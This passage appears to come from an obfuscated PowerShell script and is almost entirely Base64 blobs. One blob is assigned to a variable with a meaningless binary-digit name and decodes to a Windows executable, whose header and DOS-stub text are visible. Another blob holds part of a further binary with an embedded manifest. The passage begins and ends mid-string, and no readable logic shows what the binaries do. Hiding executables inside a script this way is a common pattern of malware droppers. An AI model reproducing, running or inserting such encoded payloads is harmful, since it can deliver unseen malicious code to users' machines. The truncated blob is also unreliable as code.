QBBADcAeABvAEEAQQBCAEEAYwBBAEEAQwBzAFAAdwBBAEEARQBCAHcAQQBBAEIAWQBjAEEAQQBEAEkAUAB3AEEAQQBJAEIAdwBBAEEARABJAGMAQQBBAEQAWQBQAHcAQQBBAFEAQgB3AEEAQQBHAGsAYwBBAEEARABnAFAAdwBBAEEAYQBSAHcAQQBBAEgAZwBkAEEAQQBEAHMAUAB3AEEAQQBlAEIAMABBAEEASAA0AGQAQQBBAEEASQBRAEEAQQBBAGcAQgAwAEEAQQBPAFEAZABBAEEAQwBBAFAAdwBBAEEAQQBCADQAQQBBAEMARQBlAEEAQQBBAFkAUQBBAEEAQQBKAEIANABBAEEARwBBAGUAQQBBAEMAQQBQAHcAQQBBAGEAQgA0AEEAQQBCADQAZgBBAEEAQwBBAFAAdwBBAEEASQBCADgAQQBBAEQAQQBmAEEAQQBEAFkAUAB3AEEAQQBNAEIAOABBAEEARQBrAGYAQQBBAEQAWQBQAHcAQQBBAFQAQgA4AEEAQQBNAGcAZwBBAEEAQQBjAFEAQQBBAEEAeQBDAEEAQQBBAE4AbwBnAEEAQQBEAFkAUAB3AEEAQQAzAEMAQQBBAEEAQgBBAGgAQQBBAEMAQQBQAHcAQQBBAEUAQwBFAEEAQQBPAEUAaABBAEEAQgBjAFEAQQBBAEEANQBDAEUAQQBBAEYAVQBpAEEAQQBCAGsAUQBBAEEAQQBXAEMASQBBAEEASgBRAGkAQQBBAEMAQQBQAHcAQQBBAHQAQwBJAEEAQQBQAEEAaQBBAEEAQwBBAFAAdwBBAEEARQBDAE0AQQBBAEUASQBqAEEAQQBDAEEAUAB3AEEAQQBXAEMATQBBAEEASgBvAGoAQQBBAEIAdwBRAEEAQQBBAG4AQwBNAEEAQQBMAHcAagBBAEEAQgA4AFEAQQBBAEEAdgBDAE0AQQBBAE4AdwBqAEEAQQBCADgAUQBBAEEAQQArAEMATQBBAEEARABFAGsAQQBBAEQAWQBQAHcAQQBBAE4AQwBRAEEAQQBIADAAawBBAEEAQwBBAFAAdwBBAEEAZwBDAFEAQQBBAEQAQQBsAEEAQQBDAEEAUAB3AEEAQQBNAEMAVQBBAEEATQBnAGwAQQBBAEMARQBRAEEAQQBBAHkAQwBVAEEAQQBPAHcAbABBAEEAQwBBAFAAdwBBAEEANwBDAFUAQQBBAEIAVQBtAEEAQQBDAEEAUAB3AEEAQQBHAEMAWQBBAEEARwBjAG0AQQBBAEMAQQBQAHcAQQBBAGEAQwBZAEEAQQBIADgAbQBBAEEARABZAFAAdwBBAEEAZwBDAFkAQQBBAEMAdwBuAEEAQQBDAHMAUQBBAEEAQQBZAEMAYwBBAEEASABzAG4AQQBBAEQAWQBQAHcAQQBBAG8AQwBjAEEAQQBPAG8AbwBBAEEAQwA0AFEAQQBBAEEAOQBDAGcAQQBBAEUAWQBwAEEAQQBEAFkAUAB3AEEAQQBXAEMAawBBAEEASgBBAHAAQQBBAEQAWQBQAHcAQQBBAGsAQwBrAEEAQQBNAHcAcABBAEEAQgB3AFEAQQBBAEEAegBDAGsAQQBBAEEAZwBxAEEAQQBCAHcAUQBBAEEAQQBDAEMAbwBBAEEARABNAHEAQQBBAEMAQQBQAHcAQQBBAE4AQwBvAEEAQQBLADgAcgBBAEEARABJAFEAQQBBAEEAaQBDAHcAQQBBAEsAVQBzAEEAQQBEAFkAUAB3AEEAQQBxAEMAdwBBAEEAQQBNAHQAQQBBAEQAYwBRAEEAQQBBAEIAQwAwAEEAQQBJAE0AdABBAEEARABrAFEAQQBBAEEAbwBDADAAQQBBAEsASQB0AEEAQQBEAFkAUQBBAEEAQQAzAEMAMABBAEEAUABvAHQAQQBBAEIAVQBRAEEAQQBBACsAaQAwAEEAQQBCAEkAdQBBAEEAQwBrAFEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAUQBBAFkAQQBBAEEAQQBHAEEAQQBBAGcAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAFEAQQBCAEEAQQBBAEEATQBBAEEAQQBnAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBRAEEASgBCAEEAQQBBAFMAQQBBAEEAQQBHAEIAdwBBAEEAQgA5AEEAUQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEARAB3AC8AZQBHADEAcwBJAEgAWgBsAGMAbgBOAHAAYgAyADQAOQBKAHoARQB1AE0AQwBjAGcAWgBXADUAagBiADIAUgBwAGIAbQBjADkASgAxAFYAVQBSAGkAMAA0AEoAeQBCAHoAZABHAEYAdQBaAEcARgBzAGIAMgA1AGwAUABTAGQANQBaAFgATQBuAFAAegA0AE4AQwBqAHgAaABjADMATgBsAGIAVwBKAHMAZQBTAEIANABiAFcAeAB1AGMAegAwAG4AZABYAEoAdQBPAG4ATgBqAGEARwBWAHQAWQBYAE0AdABiAFcAbABqAGMAbQA5AHoAYgAyAFoAMABMAFcATgB2AGIAVABwAGgAYwAyADAAdQBkAGoARQBuAEkARwAxAGgAYgBtAGwAbQBaAFgATgAwAFYAbQBWAHkAYwAyAGwAdgBiAGoAMABuAE0AUwA0AHcASgB6ADQATgBDAGkAQQBnAFAASABSAHkAZABYAE4AMABTAFcANQBtAGIAeQBCADQAYgBXAHgAdQBjAHoAMABpAGQAWABKAHUATwBuAE4AagBhAEcAVgB0AFkAWABNAHQAYgBXAGwAagBjAG0AOQB6AGIAMgBaADAATABXAE4AdgBiAFQAcABoAGMAMgAwAHUAZABqAE0AaQBQAGcAMABLAEkAQwBBAGcASQBEAHgAegBaAFcATgAxAGMAbQBsADAAZQBUADQATgBDAGkAQQBnAEkAQwBBAGcASQBEAHgAeQBaAFgARgAxAFoAWABOADAAWgBXAFIAUQBjAG0AbAAyAGEAVwB4AGwAWgAyAFYAegBQAGcAMABLAEkAQwBBAGcASQBDAEEAZwBJAEMAQQA4AGMAbQBWAHgAZABXAFYAegBkAEcAVgBrAFIAWABoAGwAWQAzAFYAMABhAFcAOQB1AFQARwBWADIAWgBXAHcAZwBiAEcAVgAyAFoAVwB3ADkASgAyAEYAegBTAFcANQAyAGIAMgB0AGwAYwBpAGMAZwBkAFcAbABCAFkAMgBOAGwAYwAzAE0AOQBKADIAWgBoAGIASABOAGwASgB5AEEAdgBQAGcAMABLAEkAQwBBAGcASQBDAEEAZwBQAEMAOQB5AFoAWABGADEAWgBYAE4AMABaAFcAUgBRAGMAbQBsADIAYQBXAHgAbABaADIAVgB6AFAAZwAwAEsASQBDAEEAZwBJAEQAdwB2AGMAMgBWAGoAZABYAEoAcABkAEgAawArAEQAUQBvAGcASQBEAHcAdgBkAEgASgAxAGMAMwBSAEoAYgBtAFoAdgBQAGcAMABLAFAAQwA5AGgAYwAzAE4AbABiAFcASgBzAGUAVAA0AE4AQwBnAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBEAEEAQQBBAEQAUQBBAEEAQQBCAGcAbwBtAGkAaQBlAEsASwBRAG8AcABpAGkAMABLAEwAWQBvAHUAQwBpADYASwBMAHcAbwBoAEMAagBHAEsATQBnAG8AegBpAGoAUQBLAE4ASQBvADIAaQBqAGMASwBQAFkAcQBQAEMAbwArAEsAZwBBAEEAQQBCAFEAQQBBAEEAUQBBAEEAQQBBAE8ASwBCAGcAbwBJAGkAZwB1AEsAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAD0A')))
${01010101001110101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABWAHEAUQBBAEEATQBBAEEAQQBBAEUAQQBBAEEAQQAvAC8AOABBAEEATABnAEEAQQBBAEEAQQBBAEEAQQBBAFEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBFAEEAQQBBADQAZgB1AGcANABBAHQAQQBuAE4ASQBiAGcAQgBUAE0AMABoAFYARwBoAHAAYwB5AEIAdwBjAG0AOQBuAGMAbQBGAHQASQBHAE4AaABiAG0ANQB2AGQAQwBCAGkAWgBTAEIAeQBkAFcANABnAGEAVwA0AGcAUgBFADkAVABJAEcAMQB2AFoARwBVAHUARABRADAASwBKAEEAQQBBAEEAQQBBAEEAQQBBAEQAWgBEAHQASgBhAG4AVwArADgAQwBaADEAdgB2AEEAbQBkAGIANwB3AEoAbABCAGMAdgBDAFoAZAB2AHYAQQBrAHAAQgBiAGsASQBoAFcAKwA4AEMAUwBrAEYAdQBBAGkAUgBiADcAdwBKAEsAUQBXAC8AQwBKAHgAdgB2AEEAawBwAEIAYgAwAEkAbQBXACsAOABDAGYAZwBKAHYAUQBpAFkAYgA3AHcASgBuAFcAKwA5AEMAZABwAHYAdgBBAG4AcABCAEwAVQBJAG4ARwArADgAQwBlAGsARQBRAHcAbQBjAGIANwB3AEoANgBRAFMAKwBDAEoAeAB2AHYAQQBsAFMAYQBXAE4AbwBuAFcAKwA4AEMAUQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEYAQgBGAEEAQQBCAE0AQQBRAFUAQQBHAE4ATwBBAFgAZwBBAEEAQQBBAEEAQQBBAEEAQQBBADQAQQBBAEMAQQBRAHMAQgBEAGgAUQBBAEgAQQBBAEEAQQBDAEEAQQBBAEEAQQBBAEEAQQBEAG0ASAB3AEEAQQBBAEIAQQBBAEEAQQBBAHcAQQBBAEEAQQBBAEUAQQBBAEEAQgBBAEEAQQBBAEEAQwBBAEEAQQBHAEEAQQBBAEEAQQBBAEEAQQBBAEEAWQBBAEEAQQBBAEEAQQBBAEEAQQBBAEkAQQBBAEEAQQBBAEUAQQBBAEEAQQBBAEEAQQBBAEEAdwBCAEEAZwBRAEEAQQBFAEEAQQBBAEUAQQBBAEEAQQBBAEEAUQBBAEEAQQBRAEEAQQBBAEEAQQBBAEEAQQBFAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAFYARAB3AEEAQQBNAGcAQQBBAEEAQQBBAFkAQQBBAEEANABBAEUAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBjAEEAQQBBAGkAQQBJAEEAQQBOAEEAMQBBAEEAQgB3AEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAFEARABZAEEAQQBFAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQB3AEEAQQBBAG8AQQBRAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEATABuAFIAbABlAEgAUQBBAEEAQQBEAGcARwB3AEEAQQBBAEIAQQBBAEEAQQBBAGMAQQBBAEEAQQBCAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEASQBBAEEAQQBZAEMANQB5AFoARwBGADAAWQBRAEEAQQBRAEIAUQBBAEEAQQBBAHcAQQBBAEEAQQBGAGcAQQBBAEEAQwBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEUAQQBBAEEARQBBAHUAWgBHAEYAMABZAFEAQQBBAEEAQQBBAEUAQQBBAEEAQQBVAEEAQQBBAEEAQQBJAEEAQQBBAEEAMgBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBCAEEAQQBBAEQAQQBMAG4ASgB6AGMAbQBNAEEAQQBBAEQAZwBBAFEAQQBBAEEARwBBAEEAQQBBAEEAQwBBAEEAQQBBAE8AQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBRAEEAQQBBAFEAQwA1AHkAWgBXAHgAdgBZAHcAQQBBAGkAQQBJAEEAQQBBAEIAdwBBAEEAQQBBAEIAQQBBAEEAQQBEAG8AQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEARQBBAEEAQQBFAEkAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEATABqAHcAVQAwAEEAQQB3ADgAegBNAHoATQB6AE0AegBNAHoATQB6AE0AeABWAGkAKwB5AEQANQBQAGoALwBkAFEAeABxAEEARgBKAFIANgBOADcALwAvAC8ALwAvAGMAQQBUAC8ATQBQADgAVgBGAEQARgBBAEEASQBQAEUARwBJAHYAbABYAGMAUABNAHoATQB6AE0AegBNAHoATQB6AE0AegBNAHoATQB4AFYAaQArAHgAUgBqAFUAVQBNAFUARgBGAHEAQQBmADgAVgBHAEQARgBBAEEASQB0AFYAQwBJAFAARQBCAEkAdgBJADYATABMAC8ALwAvACsARAB4AEEAaABaAFgAYwBQAE0AegBNAHoATQB6AE0AegBNAHoATQB6AE0AegBNAHgAVgBpACsAeQBEADUAUABpAEQANwBCAHkAaABCAEYAQgBBAEEARABQAEUAaQBVAFEAawBHAEYAYQBOAFIAQwBRAEUAaQAvAEYAUQBhAE4AUQB5AFEAQQBCAHEAQQBQADgAVgBBAEQAQgBBAEEASQBYAEEAZABTAGIALwBGAFQAQQB3AFEAQQBCAFEAYQBOAEEAeABRAEEARABvAGsAdgAvAC8ALwA0AFAARQBDAEQAUABBAFgAbwB0AE0ASgBCAGcAegB6AE8AaQBSAEQAQQBBAEEAaQArAFYAZAB3ADQAdABFAEoAQQBSAHEAQQBHAG8AQQBpAFUAUQBrAEcASQB0AEUASgBCAEIAcQBFAEkAbABFAEoAQwBDAE4AUgBDAFEAWQBVAEcAbwBBAFYAcwBkAEUASgBDAFEAQgBBAEEAQQBBAHgAMABRAGsATQBBAEkAQQBBAEEARAAvAEYAUQBRAHcAUQBBAEMARgB3AEgAVQBtAC8AeABVAHcATQBFAEEAQQBVAEcAagAwAE0AVQBBAEEANgBEAFQALwAvAC8AKwBEAHgAQQBnAHoAdwBGADYATABUAEMAUQBZAE0AOAB6AG8ATQB3AHcAQQBBAEkAdgBsAFgAYwBQAC8ARgBUAEEAdwBRAEEAQQA5AEYAQQBVAEEAQQBIAFUAZgBhAEIAdwB5AFEAQQBEAG8AQwBQAC8ALwAvADQAUABFAEIARABQAEEAWABvAHQATQBKAEIAZwB6AHoATwBnAEgARABBAEEAQQBpACsAVgBkAHcANAB0AE0ASgBCAHkANABBAFEAQQBBAEEARgA0AHoAegBPAGoAeQBDAHcAQQBBAGkAKwBWAGQAdwA4AHoATQB6AE0AegBNAHoATQB6AE0AegBNAHoATQB6AE0AegBNAFYAWQB2AHMAYQB2ADkAbwBoAGkAdABBAEEARwBTAGgAQQBBAEEAQQBBAEYAQwBCADcARABnAEMAQQBBAEMAaABCAEYAQgBBAEEARABQAEYAaQBVAFgAdwBVADEAWgBYAFUASQAxAEYAOQBHAFMAagBBAEEAQQBBAEEASQB2AHgAaQBiAFgASQAvAGYALwAvAGoAWQBYAGsALwBmAC8ALwBpAGIAWABJAC8AZgAvAC8AVQBJADIARgA3AFAAMwAvAC8AOABlAEYANQBQADMALwAvAHcARQBCAEEAQQBCAFEALwB4AFUAWQBNAEUAQQBBAE0AOABEAEgAaABkAHoAOQAvAC8AOABBAEEAQQBBAEEAagBZADMAcwAvAGYALwAvAHgANABYAGcALwBmAC8ALwBCAHcAQQBBAEEARwBhAEoAaABjAHoAOQAvAC8AKwBOAFUAUQBKAG0AaQB3AEcARAB3AFEASgBtAGgAYwBCADEAOQBTAHYASwBqAFkAWABzAC8AZgAvAC8AMABmAGwAUgBVAEkAMgBOAHoAUAAzAC8ALwArAGkAdQBCAGcAQQBBAHgAMABYADgAQQBBAEEAQQBBAEkAMgBWAHoAUAAzAC8ALwA0AE8AOQA0AFAAMwAvAC8AdwBpAEwAegBvAHUARgAzAFAAMwAvAC8AdwA5AEQAbABjAHoAOQAvAC8ALwBIAFIAaABBAEEAQQBBAEEAQQB4ADAAWQBVAEQAdwBBAEEAQQBNAFkARwBBAEkAMABjAFEAbwAyAEYAegBQADMALwAvADQAdgA3AEQAMABPAEYAegBQADMALwAvAHkAdgA0AGkAWQBYAG8ALwBmAC8ALwBpADgAZgBSACsARgBEAG8AOQBnAGcAQQBBAEkAbQAxAHYAUAAzAC8ALwA0ADEASABBAGMAWgBGAC8AQQBHAEwAdgBlAGoAOQAvAC8AOAB6AHkAZABIAG8ATwAvAHYASABoAGMAVAA5AC8ALwA4AEEAQQBBAEEAQQBEADAAZgBCAGkAWQBYAEkALwBmAC8ALwBoAGMAQgAwAFoARwBZAFAASAAwAFEAQQBBAEkAbwBmAGkAMAA0AFEAaQAxAFkAVQBpAEoAMwBvAC8AZgAvAC8ATwA4AHAAegBHAFkAMQBCAEEAWQBsAEcARQBJAHYARwBnAC8AbwBRAGMAZwBLAEwAQgBvAGcAYwBDAE0AWgBFAEMAQQBFAEEANgB4AHYALwB0AGUAagA5AC8ALwAvAEcAaABjAEQAOQAvAC8AOABBAC8ANwBYAEEALwBmAC8ALwBVAFkAdgBPADYAQwBvAEgAQQBBAEMATABoAGMAVAA5AC8ALwArAEQAeAB3AEoAQQBpAFkAWABFAC8AZgAvAC8ATwA0AFgASQAvAGYALwAvAGQAYQBLAEwAbABlAEQAOQAvAC8AKwBEACsAZwBoAHkATgA0AHUATgB6AFAAMwAvAC8ANAAwAFUAVgBRAEkAQQBBAEEAQwBMAHcAWQBIADYAQQBCAEEAQQBBAEgASQBXAGkAMABuADgAZwA4AEkAagBLADgARwBEAHcAUAB5AEQAKwBCADkAMgBCAHYAOABWAHcARABCAEEAQQBGAEoAUgA2AEYAUQBLAEEAQQBDAEQAeABBAGkATAB4AG8AdABOADkARwBTAEoARABRAEEAQQBBAEEAQgBaAFgAMQA1AGIAaQAwADMAdwBNADgAMwBvADkAZwBrAEEAQQBJAHYAbABYAGMAUABNAHoARgBXAEwANwBJAEgAcwBNAEEASQBBAEEASwBFAEUAVQBFAEEAQQBNADgAVwBKAFIAZgB4AFQAVgBtAG8AQQBhAGcASwBMADIAYwBlAEYAMABQADMALwAvAHkAdwBDAEEAQQBEAC8ARgBUAFEAdwBRAEEAQwBMADgASQBQACsALwAzAFUAUwBYAGoAUABBAFcANAB0AE4ALwBEAFAATgA2AEwAQQBKAEEAQQBDAEwANQBWADMARABWADQAMgBGADAAUAAzAC8ALwAxAEIAVwAvAHgAVQBvAE0ARQBBAEEAagBZAFgAMAAvAGYALwAvAGkAOAB0AFEANgBCADgARQBBAEEAQwBGAHcASABSAFYAaQB6ADAAcwBNAEUAQQBBAGoAWQBYAFEALwBmAC8ALwBVAEYAYgAvADEANABYAEEAZABDAGMAUABIADQAQQBBAEEAQQBBAEEAagBZAFgAMAAvAGYALwAvAGkAOAB0AFEANgBQAEkARABBAEEAQwBGAHcASABRAG8AagBZAFgAUQAvAGYALwAvAFUARgBiAC8AMQA0AFgAQQBkAGUAQgBXAC8AeABVAGsATQBFAEEAQQBYADEANAB6AHcARgB1AEwAVABmAHcAegB6AGUAZwA2AEMAUQBBAEEAaQArAFYAZAB3ADEAYgAvAEYAUwBRAHcAUQBBAEMATABUAGYAeQBMAGgAZABqADkALwAvADgAegB6AFYAOQBlAFcAKwBnAGMAQwBRAEEAQQBpACsAVgBkAHcAOAB6AE0AegBNAHoATQB6AE0AegBNAFYAWQB2AHMAYQB2ADkAbwB1AEMAdABBAEEARwBTAGgAQQBBAEEAQQBBAEYAQwBCADcASgBRAEEAQQBBAEMAaABCAEYAQgBBAEEARABQAEYAaQBVAFgAdwBWAGwAZABRAGoAVQBYADAAWgBLAE0AQQBBAEEAQQBBAGoAVQAzAFkANgBQAHYAOAAvAC8AKwBEAGUAQgBRAFEAYwBnAEsATABBAEYAQgBvAFYARABKAEEAQQBPAGkANAArAC8ALwAvAGkAMQBYAHMAZwA4AFEASQBnAC8AbwBRAGMAaQA2AEwAVABkAGgAQwBpADgARwBCACsAZwBBAFEAQQBBAEIAeQBGAG8AdABKAC8ASQBQAEMASQB5AHYAQgBnADgARAA4AGcALwBnAGYAZABnAGIALwBGAGMAQQB3AFEAQQBCAFMAVQBlAGoAVABDAEEAQQBBAGcAOABRAEkAYQBnAHcAegB3AE0AZABGADYAQQBBAEEAQQBBAEIAbwBjAEQASgBBAEEASQAxAE4AMgBNAGQARgA3AEEAYwBBAEEAQQBCAG0AaQBVAFgAWQA2AE4AdwBEAEEAQQBCAG8AagBEAEoAQQBBAE0AZABGAC8AQQBBAEEAQQBBAEQAbwBTAC8AdgAvAC8ANAAxAE4AMgBPAGgAagAvAHYALwAvAFUARwBpAHcATQBrAEEAQQA2AEQAagA3AC8ALwArAEQAeABBAHkATgBUAGQAagBvAFQAZgA3AC8ALwB3ADkAWAB3AE0AZABGAGcAQQBBAEEAQQBBAEMATAA4AE0AZQBGAGUAUAAvAC8ALwB3AEEAQQBBAEEAQwBOAGgAWAB6AC8ALwAvADkAbQBEAHgATgBGAG0ARgBCAHEASQBHAFkAUABFADAAVwBnAFoAZwA4AFQAUgBhAGgAbQBEAHgATgBGAHMARwBZAFAARQAwAFcANABaAGcAOABUAFIAYwBCAG0ARAB4AE4ARgB5AEcAWQBQAEUAMABYAFEARAB4AEYARgBoAE0AZABGAGwARQBRA